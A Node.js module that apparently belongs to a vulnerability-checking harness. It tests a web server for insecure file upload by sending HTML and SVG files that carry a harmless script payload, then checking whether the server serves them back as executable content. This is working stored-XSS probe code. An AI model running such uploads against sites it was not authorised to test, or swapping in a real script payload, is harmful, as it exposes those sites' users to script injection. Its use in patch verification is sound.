const axios = require('axios');
const FormData = require('form-data');

// Insecure file upload: upload a file containing JavaScript and check whether
// the server stores it AND serves it back with an HTML-ish Content-Type. We
// try a small set of executable extensions so naive blacklists (e.g. blocking
// only .html) and filename-mangling-only patches both get caught.
const PAYLOAD = '<script>document.title="pwned"</script>';
const VARIANTS = [
  { filename: 'malicious.html', contentType: 'text/html' },
  { filename: 'malicious.htm', contentType: 'text/html' },
  { filename: 'malicious.svg', contentType: 'image/svg+xml' },
];
const EXECUTABLE_RE = /text\/html|image\/svg\+xml/i;

async function tryVariant(baseUrl, variant) {
  const form = new FormData();
  form.append('file', Buffer.from(PAYLOAD), {
    filename: variant.filename,
    contentType: variant.contentType,
  });

  const upload = await axios.post(`${baseUrl}/upload`, form, {
    headers: form.getHeaders(),
    timeout: 5000,
    validateStatus: () => true,
  });

  if (upload.status >= 400) {
    return { exploited: false, summary: `upload ${variant.filename}: ${upload.status}` };
  }

  // Use the path the server returned rather than reconstructing it ourselves —
  // a patch that renames uploads (random prefix, hash, etc.) would otherwise
  // look "safe" simply because we couldn't guess the new name.
  const storedPath =
    upload.data && typeof upload.data.path === 'string'
      ? upload.data.path
      : `/files/${variant.filename}`;

  const fetched = await axios.get(`${baseUrl}${storedPath}`, {
    timeout: 5000,
    responseType: 'text',
    transformResponse: [(d) => d],
    validateStatus: () => true,
  });

  const contentType = (fetched.headers && fetched.headers['content-type']) || '';
  if (fetched.status === 200 && EXECUTABLE_RE.test(contentType)) {
    return {
      exploited: true,
      payload: `POST /upload ${variant.filename} → GET ${storedPath}`,
      evidence: `Uploaded ${variant.filename} served with Content-Type=${contentType}`.slice(0, 200),
    };
  }

  return {
    exploited: false,
    summary: `GET ${storedPath}: ${fetched.status} (Content-Type=${contentType || 'none'})`,
  };
}

async function runFileUploadAttack({ baseUrl }) {
  const start = Date.now();
  const tried = [];

  // best-effort cleanup of any leftover upload from a previous run
  try {
    await axios.post(`${baseUrl}/reset`, {}, { timeout: 2000 });
  } catch {}

  try {
    for (const variant of VARIANTS) {
      const out = await tryVariant(baseUrl, variant);
      if (out.exploited) {
        return {
          vulnerability: 'file-upload',
          exploited: true,
          payload: out.payload,
          evidence: out.evidence,
          durationMs: Date.now() - start,
        };
      }
      tried.push(out.summary);
    }

    return {
      vulnerability: 'file-upload',
      exploited: false,
      payload: null,
      evidence: tried.join('; ').slice(0, 200),
      durationMs: Date.now() - start,
    };
  } catch (err) {
    return {
      vulnerability: 'file-upload',
      exploited: false,
      payload: null,
      evidence: `Upload attack failed: ${err.message}`.slice(0, 200),
      durationMs: Date.now() - start,
    };
  } finally {
    try {
      await axios.post(`${baseUrl}/reset`, {}, { timeout: 2000 });
    } catch {}
  }
}

module.exports = { runFileUploadAttack };
